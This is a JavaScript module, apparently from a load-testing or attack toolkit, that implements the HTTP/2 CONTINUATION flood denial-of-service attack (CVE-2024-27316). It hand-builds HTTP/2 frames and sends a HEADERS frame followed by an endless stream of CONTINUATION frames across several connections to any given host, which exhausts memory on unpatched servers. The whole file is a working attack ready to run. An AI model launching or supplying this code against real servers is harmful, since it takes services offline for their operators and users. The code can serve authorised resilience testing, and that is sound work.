/**
 * HTTP/2 CONTINUATION Flood (CVE-2024-27316)
 *
 * Sends HEADERS frames without the END_HEADERS flag, followed by CONTINUATION
 * frames indefinitely. The server accumulates the header block in memory
 * without being able to process the request, causing OOM on unpatched servers.
 *
 * Implemented with raw TCP/TLS because Node's http2 module does not expose
 * frame-level control.
 */

import net from 'net';
import tls from 'tls';
import { URL } from 'url';

const HTTP2_PREFACE = Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n');

function makeFrame(type, flags, streamId, payload) {
  const buf = Buffer.alloc(9 + payload.length);
  buf.writeUIntBE(payload.length, 0, 3);   // length: 3 bytes
  buf.writeUInt8(type,  3);                // type:   1 byte
  buf.writeUInt8(flags, 4);                // flags:  1 byte
  buf.writeUInt32BE(streamId & 0x7FFFFFFF, 5); // stream id: 4 bytes
  payload.copy(buf, 9);
  return buf;
}

// Empty SETTINGS frame (type=0x4, flags=0x0, stream=0)
const SETTINGS_FRAME = makeFrame(0x4, 0x0, 0, Buffer.alloc(0));

// HPACK: literal header field never indexed, new name
function hpackHeader(name, value) {
  const n = Buffer.from(name);
  const v = Buffer.from(value);
  return Buffer.concat([Buffer.from([0x10, n.length]), n, Buffer.from([v.length]), v]);
}

// A large-ish header block to maximize memory pressure per frame
const HEADER_BLOCK = Buffer.concat(
  Array.from({ length: 8 }, (_, i) =>
    hpackHeader(`x-fusill-${i}`, 'a'.repeat(60))
  )
);

export async function runHttp2Continuation(target, config, durationSeconds) {
  const {
    connections           = 5,
    frames_per_connection = Infinity,
  } = config;

  const url     = new URL(target.startsWith('http') ? target : `https://${target}`);
  const isHttps = url.protocol === 'https:';
  const host    = url.hostname;
  const port    = parseInt(url.port) || (isHttps ? 443 : 80);

  const endTime = Date.now() + durationSeconds * 1000;
  let totalFrames = 0, connErrors = 0;

  function runConnection() {
    return new Promise((resolve) => {
      let done = false;
      const finish = () => { if (!done) { done = true; resolve(); } };

      const opts = { host, port, rejectUnauthorized: false };
      const sock = isHttps ? tls.connect(opts, onConnect) : net.connect(opts, onConnect);

      sock.on('error', () => { connErrors++; finish(); });
      sock.on('close', finish);
      sock.setTimeout(durationSeconds * 1000 + 2000, () => { sock.destroy(); finish(); });

      function onConnect() {
        sock.write(HTTP2_PREFACE);
        sock.write(SETTINGS_FRAME);
        // HEADERS frame on stream 1, NO END_HEADERS (type=0x1, flags=0x0)
        sock.write(makeFrame(0x1, 0x0, 1, HEADER_BLOCK));

        let sent = 0;

        function sendNext() {
          if (done || Date.now() >= endTime || sent >= frames_per_connection) {
            sock.destroy();
            finish();
            return;
          }
          // CONTINUATION frame, NO END_HEADERS (type=0x9, flags=0x0)
          const frame = makeFrame(0x9, 0x0, 1, HEADER_BLOCK);
          const ok = sock.write(frame);
          sent++;
          totalFrames++;
          if (ok) setImmediate(sendNext);
          else sock.once('drain', sendNext); // respect backpressure
        }

        sendNext();
      }
    });
  }

  await Promise.all(Array.from({ length: connections }, runConnection));

  return {
    avgLatencyMs      : 0,
    errorRateBps      : Math.round((connErrors / Math.max(connections, 1)) * 10000),
    requestsCompleted : totalFrames,
  };
}
